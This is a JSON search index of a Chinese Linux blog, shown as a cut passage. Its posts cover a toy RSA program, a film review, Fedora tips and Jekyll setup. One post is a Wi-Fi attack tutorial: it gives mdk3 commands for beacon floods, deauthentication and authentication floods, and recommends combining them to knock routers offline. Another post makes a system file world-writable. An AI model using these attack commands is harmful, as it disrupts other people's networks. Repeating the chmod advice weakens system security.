class=\"p\">}</span>\n<span class=\"kt\">int</span> <span class=\"nf\">f</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">m</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">m</span><span class=\"o\">%</span><span class=\"n\">n</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">c</span><span class=\"o\">!=</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">m</span><span class=\"o\">=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">n</span><span class=\"o\">=</span><span class=\"n\">c</span><span class=\"p\">;</span><span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">m</span><span class=\"o\">%</span><span class=\"n\">n</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">int</span> <span class=\"nf\">start</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">p</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">q</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">l</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">e</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">d</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"RSA tool</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"please input two prime number:\"</span><span class=\"p\">);</span>\n  <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d %d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">p</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">q</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">prime</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">)</span><span class=\"o\">!=</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">||</span><span class=\"p\">(</span><span class=\"n\">prime</span><span class=\"p\">(</span><span class=\"n\">q</span><span class=\"p\">)</span><span class=\"o\">!=</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"number(s) is(are) not the prime number!</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span><span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);}</span>\n  <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"n\">p</span><span class=\"o\">*</span><span class=\"n\">q</span><span class=\"p\">;</span>\n  <span class=\"n\">l</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">*</span><span class=\"p\">(</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">/</span><span class=\"n\">f</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"n\">srand</span><span class=\"p\">((</span><span class=\"kt\">unsigned</span><span class=\"p\">)</span><span class=\"n\">time</span><span class=\"p\">(</span><span class=\"nb\">NULL</span><span class=\"p\">));</span>\n  <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">rand</span><span class=\"p\">()</span><span class=\"o\">%</span><span class=\"p\">(</span><span class=\"n\">l</span><span class=\"o\">-</span><span class=\"mi\">4</span><span class=\"p\">))</span><span class=\"o\">+</span><span class=\"mi\">2</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">f</span><span class=\"p\">(</span><span class=\"n\">l</span><span class=\"p\">,</span><span class=\"n\">temp</span><span class=\"p\">)</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">e</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"k\">break</span><span class=\"p\">;}</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"(E,N)=(%d,%d)</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span><span class=\"n\">e</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"p\">);</span>\n  <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">srand</span><span class=\"p\">((</span><span class=\"kt\">unsigned</span><span class=\"p\">)</span><span class=\"n\">time</span><span class=\"p\">(</span><span class=\"nb\">NULL</span><span class=\"p\">));</span>\n    <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">rand</span><span class=\"p\">()</span><span class=\"o\">%</span><span class=\"p\">(</span><span class=\"n\">l</span><span class=\"o\">-</span><span class=\"mi\">4</span><span class=\"p\">))</span><span class=\"o\">+</span><span class=\"mi\">2</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(((</span><span class=\"n\">temp</span><span class=\"o\">*</span><span class=\"n\">e</span><span class=\"p\">)</span><span class=\"o\">%</span><span class=\"n\">l</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">temp</span><span class=\"o\">!=</span><span class=\"n\">e</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">d</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"k\">break</span><span class=\"p\">;}</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"(D,N)=(%d,%d)</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span><span class=\"n\">d</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"n\">start</span><span class=\"p\">();</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "《监视者》影评",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2016/09/30/%E7%9B%91%E8%A7%86%E8%80%85-%E5%BD%B1%E8%AF%84.html",
      "date"     : "2016-09-30 19:29:00 +0800",
      "content"  : "<blockquote>\n  <p>《监视者们》翻拍自香港电影《跟踪》，是由赵义硕，金秉瑞联合执导，薛景求，郑雨盛，韩孝珠，李俊昊等主演的动作剧情片。<br />\n该片描写了隐蔽真实身份的监视专家们与每次受到危机四伏的追踪却都能幸运逃脱的秘密犯罪者之间惊心动魄的对决。以监视特定对象的警察内部特殊组织部门监视班为背景，讲述特殊犯罪科监视班队员与银行盗窃团伙之间发生的故事。于2013年7月3日在韩国上映，票房突破550万，并受邀参展多伦多国际电影节。2014年9月16日在中国大陆上映，并更名为《绝密跟踪》。</p>\n</blockquote>\n\n<p>       影片的剧情可谓是非常刺激的。开篇，就是黄组长对“花猪”的考验，使得整部片子的节奏感特别强。记忆力超群的“花猪”成功经受住了黄组长的考量——快速回忆了地铁上黄组长经历与周围发生的一切细节。事实上，这让我想到了丢东西后瞬时对脑海中所有场景的回忆。回忆之快，超乎想象。<br />\n       “注意力错觉，也叫非注意盲视。人们通常只会记住自己所关注的东西，你看到了地铁里的一切，但是你只记住了你关注的东西“。生活中我们总会忽视、忘记什么。大脑是选择性记忆的，这就是因为我们并没有关注而导致忘记。<br />\n       追踪影子的那一段是异常精彩的。<br />\n       “影子”正准备第二次洗劫银行。穿着风衣，手提卡其色公文包，低头匆匆走向交易所。黄组长在交易所附近的街道上不断搜查嫌疑人。他扫视到了“影子”，敏锐的职业习惯让他多加注意了几眼这个行色匆匆的人。随后，“花猪”上了的士，但一上车就脱去了紫色羽绒大衣，整换了头型——作为一个行事有道的惯犯，这一反常举动引起了“影子”冥冥之中的注意。很快，“影子”登上了交易所的顶楼——站在至高点指挥全盘犯罪计划。正当他用高倍单筒望远镜扫视四周时，又发现了那位反常的女子——“花猪”——她又换了一套外衣，改变了头饰与发型——更为反常的是，她的上下车地点仅相隔几步之遥。任何人都不会用这种方式打的士，“影子”想到，这正是警方惯用的搜查方式。最后一个举动，使“影子”肯定了，她，就是警察——“花猪”跟随“影子”同伙的车辆跑去。</p>\n\n<p>       这一段的情节紧凑连贯，细节缜密，小说意味极强，也是整部电影中极其精彩的一段。原片对这一段的节奏感控制的很恰当，很详细的描写出了“影子”当时的眼神。从而刻画出了人物心理，而并不是像国内二三流电视剧，滥用心理独白。<br />\n       事实上，这篇电影中有很多的黑客元素（不关于技术方面）。可以说，黑客在理想化状态中就是如同“影子”般冷漠、冷酷、冷静的，计划缜密，天衣无缝。从另一种角度来解析，也有另一层含义——不要相信自己以外的任何人。<br />\n       <strong>人们通常只会记住自己所关注的东西，去发现别人注意与不注意的一切————你，就是上帝。</strong></p>\n"
    } ,
  
    {
      "title"    : "Fedora关闭合上笔记本屏幕挂起",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/09/23/Fedora%E5%85%B3%E9%97%AD%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95%E6%8C%82%E8%B5%B7.html",
      "date"     : "2016-09-23 17:38:00 +0800",
      "content"  : "<p>与众多的Linux版本一样，因为内核的缘故，Fedora笔记本在合上屏幕时会自动挂起，很有可能无法唤醒。<br />\n如何解决这个问题呢？</p>\n<ul>\n  <li>我们需要编辑<code class=\"highlighter-rouge\">/etc/systemd/logind.conf</code>这个配置文件，但是它属于系统文件，所以是只读的，我们要执行以下命令：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>chmod a+w /etc/systemd/logind.conf\n</code></pre>\n    </div>\n  </li>\n  <li>这样我们就有了更改配置文件的权限</li>\n  <li>接下来我们打开并编辑它\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>vim /etc/systemd/logind.conf\n</code></pre>\n    </div>\n  </li>\n  <li>找到关键字 HandleLidSwitch 将其值改为 ignore。并把本行头的注释去掉：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>HandleLidSwitch=ignore\n</code></pre>\n    </div>\n  </li>\n</ul>\n\n<p>reboot<br />\nOK，这个问题就完美解决了!<br />\nPS:资源下载已搬迁至about页面</p>\n"
    } ,
  
    {
      "title"    : "在Fedora上使用TC3.0",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0.html",
      "date"     : "2016-08-30 08:41:00 +0800",
      "content"  : "<blockquote>\n  <p>Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。</p>\n</blockquote>\n\n<p><a href=\"http://download.pchome.net/development/linetools/detail-9113.html\">Turbo C3.0英文原版安装包</a><br />\n如何在Linux上使用Turbo C3.0呢？<br />\n我们将下载的安装包解压在/home/{username}/TurboC3.0中<br />\n现在我们需要安装DOSBOX来模拟DOS环境:</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo dnf install dosbox.x86_64\n</code></pre>\n</div>\n<p>安装完毕后我们打开dosbox，默认的提示符是Z，我们使用mount命令来挂载,使在dosbox内的程序将/home/{username}/TurboC3.0作为C:\\</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>mount c /home/{username}/TurboC3.0\n</code></pre>\n</div>\n\n<p>打开C:\\</p>\n\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>c:\n</code></pre>\n</div>\n\n<p>进行安装:</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>install\n</code></pre>\n</div>\n\n<p>在安装界面中SOURCE drive选择C，也相当于/home/{username}/TurboC3.0<br />\n其余默认<br />\n最后选择start installation<br />\n完成后，TurboC3.0主程序会在/home/{username}/TurboC3.0/TC/BIN/TC.EXE</p>\n\n<p>再次打开DOSBOX</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>mount c /home/{username}/TurboC3.0\nc:\ncd /tc/bin\ntc\n</code></pre>\n</div>\n<p>OK,可以编写程序进行测试，如果不行，可以<strong>更改函数库路径</strong>解决</p>\n\n<p><strong>祝你成功！</strong></p>\n"
    } ,
  
    {
      "title"    : "使用mdk3+aircrack-ng攻击路由器",
      "category" : "",
      "tags"     : "Linux, 网络",
      "url"      : "/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html",
      "date"     : "2016-08-28 11:47:00 +0800",
      "content"  : "<blockquote>\n  <p>mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用</p>\n</blockquote>\n\n<p><a href=\"https://github.com/charlesxsh/mdk3-master\">mdk3-Github</a><br />\n<a href=\"https://github.com/LEXUGE/mdk3-master\">mdk3-Github|LEXUGE’s fork</a><br />\n<a href=\"http://www.aircrack-ng.org/index.html\">aircrack -ng</a></p>\n\n<p>现在mdk3的官网已经关闭了，在Github上还有mdk3 v6的原版改进版，为防止项目被删除，我也fork了一份，供大家备用下载。<br />\nmdk3的攻击过程中是不需要网络连接的，也就是在无网络的状态下攻击，希望大家不要恶意攻击他人，保持好自己的黑客道德。<br />\n教程在Fedora Linux下通过测试</p>\n\n<ol>\n  <li>\n    <p><code class=\"highlighter-rouge\">iwconfig</code><br />\n使用该命令来检查是哪一个接口来支持无线连接的，如我的就是wlp2s0</p>\n  </li>\n  <li>\n    <p><code class=\"highlighter-rouge\">iw dev wlp2s0 scan</code><br />\n用这个命令来扫描周围的Wi-Fi信息，SSID为路由器的名称，BSS为路由器的MAC地址<strong>（注意，截至目前，我们不需要安装任何软件）</strong></p>\n  </li>\n  <li>\n    <p><code class=\"highlighter-rouge\">dnf install aircrack-ng.x86_64</code><br />\n现在我们来安装mdk3和aircrack-ng(aircrack-ng可能名称会发生变动，具体请使用<code class=\"highlighter-rouge\">$ dnf search aircrack-ng</code>搜索软件包)</p>\n  </li>\n  <li>进入目录并编译:\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>cd /mdk3-master\nmake\nsudo make install\n</code></pre>\n    </div>\n    <p>下载完mdk3并解压完毕后，即可进行编译安装，在<code class=\"highlighter-rouge\">make</code>时会有gcc的编译警告，忽略即可，不必担心</p>\n  </li>\n  <li>验证安装:\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>cd /usr/local/sbin\n./mdk3\n</code></pre>\n    </div>\n    <p><br /></p>\n  </li>\n</ol>\n\n<ul>\n  <li>如果正确安装就可以看到mdk3输出的帮助</li>\n  <li>安装过程到此就完毕了</li>\n</ul>\n\n<p>现在，我们来介绍如何攻击  ```\nsu\nairmon-ng start {你的接口，在第一步中可以找到}\ncd /usr/local/sbin</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>第二条命令时，系统会自动关闭冲突进程，在最后会有监听端口，**注意，接下来的mon0就使用监听端口代替**  \n\n第一种模式：  \nbeacon flood mode：  \n     这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。  \n详细命令如下：  ```\n./mdk3 mon0 b\n\n      -n &lt;ssid&gt;        #自定义ESSID\n      -f &lt;filename&gt;            #读取ESSID列表文件\n      -v &lt;filename&gt;           #自定义ESSID和BSSID对应列表文件\n      -d         #自定义为Ad-Hoc模式\n      -w         #自定义为wep模式\n      -g           #54Mbit模式\n      -t            # WPA TKIP encryption\n      -a           #WPA AES encryption\n      -m          #读取数据库的mac地址\n       -c &lt;chan&gt;                   #自定义信道\n       -s &lt;pps&gt;                #发包速率\n</code></pre>\n</div>\n\n<p>第二种模式：<br />\nAuthentication DoS：<br />\n这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！  ```\n./mdk3 mon0 a\n      -a <ap_mac>              #测试指定BSS\n      -m              #使用有效数据库中的客户端mac地址\n      -c          #对应 -a ，不检查是否测试成功\n      -i  <ap_mac>           #对指定BSS进行智能攻击\n      -s <pps>               #速率，默认50</pps></ap_mac></ap_mac></p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>\n第三种模式：  \nDeauthentication/Disassociation Amok：  \n强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击......可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！  ```\nmdk3 mon0 d\n      -w &lt;filename&gt;             #白名单mac地址列表文件\n      -b &lt;filename&gt;              #黑名单mac地址列表文件\n      -s &lt;pps&gt;                        #速率，这个模式下默认无限制\n      -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1\n</code></pre>\n</div>\n\n<p>第四种模式：<br />\n802.1X test:  ```\nmdk3 mon0 x<br />\n      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击</p>\n\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>        -n &lt;ssid&gt;               \n        -t &lt;bssid&gt;        #目标客户端的mac地址               \n\n        -w &lt;WPA type&gt;\n           Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)\n        -u &lt;unicast cipher&gt;\n           Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n        -m &lt;multicast cipher&gt;\n           Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n        -s &lt;pps&gt;      #速率，默认400               \n  1 - EAPOL Logoff test       #注销认证攻击\n        -t &lt;bssid&gt;        #目标客户端的mac地址             \n        -c &lt;bssid&gt;         #目标ap的合法客户端mac               \n        -s &lt;pps&gt;         #速率，默认400                ```\n</code></pre>\n</div>\n\n<p>最后，建议这样攻击：<br />\n第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡<br />\n分别是</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>./mdk3 mon0 b\n./mdk3 mon0 d -s 120\n./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}\n./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}\n</code></pre>\n</div>\n\n<p>祝你成功！</p>\n"
    } ,
  
    {
      "title"    : "Fedora系统升级方法",
      "category" : "",
      "tags"     : "Linux",
      "url"      : "/jekyll/update/2016/08/27/Fedora%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95.html",
      "date"     : "2016-08-27 10:41:00 +0800",
      "content"  : "<p><a href=\"http://fedoraproject.org/wiki/DNF_system_upgrade\">Fedora官方教程</a></p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>$ sudo dnf upgrade --refresh\n$ sudo dnf install dnf-plugin-system-upgrade\n$ sudo dnf system-upgrade download --refresh --releasever=XX\n$ sudo dnf system-upgrade reboot\n</code></pre>\n</div>\n\n<p>其中<code class=\"highlighter-rouge\">releasever=XX</code>中的XX为版本号</p>\n"
    } ,
  
    {
      "title"    : "为何选择Linux?",
      "category" : "",
      "tags"     : "Linux",
      "url"      : "/jekyll/update/2016/08/27/%E4%B8%BA%E4%BD%95%E9%80%89%E6%8B%A9Linux.html",
      "date"     : "2016-08-27 09:35:00 +0800",
      "content"  : "<blockquote>\n  <p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。<br />\nLinux操作系统诞生于1991 年10 月5 日（这是第一次正式向外公布时间）。Linux存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。<br />\n严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>\n</blockquote>\n\n<p>GNU/Linux(以下简称Linux)与Microsoft Windows(以下简称Windows)有着本质的区别。Linux的核心是终端操作界面，而Windows的核心围绕的则是GUI。</p>\n\n<p>不要以为Linux小众，其实，Windows才是小众的。我们所使用的Android就是使用的Linux内核，Apple公司的OS X系统和iOS系统使用的就是UNIX内核(Linux的祖先)，恰恰只有Windows这个另类是独立的。</p>\n<ul>\n  <li>Linux有着极为清晰的操作系统设计理念。\n    <blockquote>\n      <p>一切都是文件、操作系统内核和软件包完全分离。而Windows则混为一潭，这也正是Windows运行速度越来越慢的秘密所在(不要听信那些所谓的“彻底卸载”、“深度清理”这在Windows上是天方夜谭，不管你如何清理，你也清理不了臃肿的注册表)</p>\n    </blockquote>\n  </li>\n  <li>Linux是一款免费的操作系统。\n    <blockquote>\n      <p>用户可以通过网络或其他途径免费获得，并可以任意修改其源代码。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数程序员参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。</p>\n    </blockquote>\n  </li>\n  <li>Linux支持多种平台\n    <blockquote>\n      <p>Linux可以运行在多种硬件平台上，如具有x86、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持Intel 64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。</p>\n    </blockquote>\n  </li>\n  <li>Linux是一款非常适合Geek、Hack的操作系统，当然也适合普通用户。那么，该如何入手Linux呢？</li>\n  <li>Linux本身的内核是我们无法使用的，我们需要使用发行版，也就是编译好的完整系统。Linux的发行版本大体可以分为两类，一类是商业公司维护的发行版本，以著名的Redhat（RHEL）为代表；一类是社区组织维护的发行版本，以Debian为代表。\n    <ol>\n      <li>Redhat，应称为Redhat系列，包括RHEL(Redhat Enterprise Linux，为收费版本)、Fedora Core(由Redhat桌面版本发展而来，免费)、CentOS(RHEL的社区克隆版本，免费)。Redhat可以说是在国内使用最多的Linux版本，甚至有人将Redhat等同于Linux。这个版本的特点就是使用人数多，资源多，而且网上的许多Linux教程也都以Redhat为例进行讲解。<br />\n  Redhat系列的包管理方式采用的是基于RPM包的YUM包管理方式，包分发方式是编译好的二进制文件。稳定性方面RHEL和CentOS的稳定性非常好，适合于服务器。<br />\n  如果你需要一个比较稳定的服务器系统，而且你不喜欢各种Linux的配置，那么你可以选择CentOS，在安装完成后经过简单的配置就能非常稳定地运行了！</li>\n      <li>Debian，或者称Debian系列，包括Debian和Ubuntu等。Debian是社区类Linux的典范，也最遵循GNU规范。Debian分为三个分支： stable, testing和unstable。其中，unstable为最新的测试版本，有相对较多的bug，适合桌面用户。testing的版本都经过测试，相对较为稳定。而stable一般只用于服务器，软件包大都比较过时，但是稳定和安全性都很高。Debian最具特色的是apt-get/dpkg包管理方式。<br />\n Ubuntu严格来说不能算一个独立的发行版本，Ubuntu是基于Debian的unstable版本加强而来，可以说Ubuntu是一个拥有Debian所有的优点，以及自己所加强的优点的近乎完美的Linux桌面系统。根据选择的桌面系统不同，有三个版本可供选择，基于Gnome的Ubuntu，基于KDE的Kubuntu以及基于Xfc的Xubuntu。特点是界面非常友好，容易上手，对硬件的支持非常全面，是最适合做桌面系统的Linux发行版本。但十分<strong>臃肿！</strong><br />\n 如果你不需要自己进行定制，不想在系统上浪费太多时间，那么你可以根据自己的爱好在ubuntu、kubuntu以及xubuntu中选一款吧，三者的区别仅仅是桌面程序的不一样。</li>\n      <li>Fedora,它是一款优秀的Linux发行版，基于Redhat，为Redhat系的一员，由Redhat资助，社区维护。其软件包、系统内核、内核技术始终使用业界最新，使用了许多新技术。可以说是引领Linux界。安装起来也<strong>很简单，运行流畅，驱动支持性极好</strong>，比较<strong>适合新手</strong>。更重要的是<strong>Fedora一直没有背离Linux理念！</strong></li>\n      <li>Arch Linux是现阶段最好的滚动发行版。更重要的是 Arch 在其他方面也表现良好。<br />\n Arch Linux 是一个为那些想了解 Linux 一切的人准备的发行版，因为你必须手动安装一切，它会让你学会基于 Linux 的操作系统的每个部分。Arch Linux 是最可定制的发行版，你获得的只是一个基础系统，然后你可以在它上面建立属于你个人的发行版。不论好坏，它都不像 openSUSE 和 Ubuntu，它没有额外的补丁和整合内容，你甚至可以获得上游开发者创建的内容。Arch Linux 也是最好的滚动发行版之一。他总是更新，用户始终使用最新的软件包，并且他们还可以通过稳定的存储库运行预发布软件。Arch 也因优异的文档闻名。 Arch Wiki 可以让我得到任何 Linux 相关的资料。它提供的所有的包和软件都可在“任何” Linux 发行版上运行。</li>\n    </ol>\n  </li>\n  <li>我使用的就是Fedora，没有任何的问题，得益于Redhat的强大。</li>\n</ul>\n\n<p><strong>最后祝你：Linux使用愉快！</strong></p>\n"
    } ,
  
    {
      "title"    : "如何在Github上搭建Jekyll博客",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/08/26/%E5%A6%82%E4%BD%95%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BAJekyll%E5%8D%9A%E5%AE%A2.html",
      "date"     : "2016-08-26 14:24:00 +0800",
      "content"  : "<blockquote>\n  <p>Jekyll 是一个简单的博客形态的静态站点生产机器。它有一个模版目录，其中包含原始文本格式的文档，通过 Markdown （或者 Textile） 以及 Liquid 转化成一个完整的可发布的静态网站，你可以发布在任何你喜爱的服务器上。Jekyll 也可以运行在 GitHub Page 上，也就是说，你可以使用 GitHub 的服务来搭建你的项目页面、博客或者网站，而且是完全免费的。</p>\n</blockquote>\n\n<p><a href=\"http://jekyllrb.com/\">Jekyll 官网</a><br />\n<a href=\"http://jekyll.bootcss.com/\">Jekyll 国内镜像</a></p>\n\n<p>Jekyll的安装过程还是比较坎坷的</p>\n<ul>\n  <li>首先安装RubyGems\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo dnf install rubygems\n</code></pre>\n    </div>\n  </li>\n  <li>安装完成后你得安装一些devel包，包括ruby-devel, libffi-devel, libxml2-devel, libyaml-devel等</li>\n  <li>完成后执行以下命令\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo gem install jekyll\n</code></pre>\n    </div>\n  </li>\n  <li>如果全程无报错，那么恭喜你，你已经成功一大半了，试试这个\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>jekyll -v\n</code></pre>\n    </div>\n  </li>\n  <li>如果正常返回版本号的话，输入以下命令\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>bundle\n</code></pre>\n    </div>\n  </li>\n  <li>系统会提示你安装bundle，安装完成后，整个安装过程就OK了！</li>\n</ul>\n\n<p>OK,接下来，我们就要搭建第一个自己的第一个BLOG了</p>\n<ul>\n  <li>首先在Github上创建一个仓库，名字为{username}.github.io</li>\n  <li>完了之后执行下面命令(你已经安装完并配置了GIT)\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo git clone {你的仓库git地址}\n</code></pre>\n    </div>\n  </li>\n  <li>接下来，我们就要来生成BLOG了，使用下面的命令\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>jekyll new blog\ncd blog\njekyll serve\n</code></pre>\n    </div>\n  </li>\n  <li>现在，你的BLOG已经在http://localhost:4000/上了！</li>\n  <li>只要将你的_site文件夹里的内容复制进GIT仓库，并执行以下命令(在GIT仓库的目录下）就可以在{username}.github.io访问了\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo git add --all\nsudo git commit -m \"提交信息\"\nsudo git 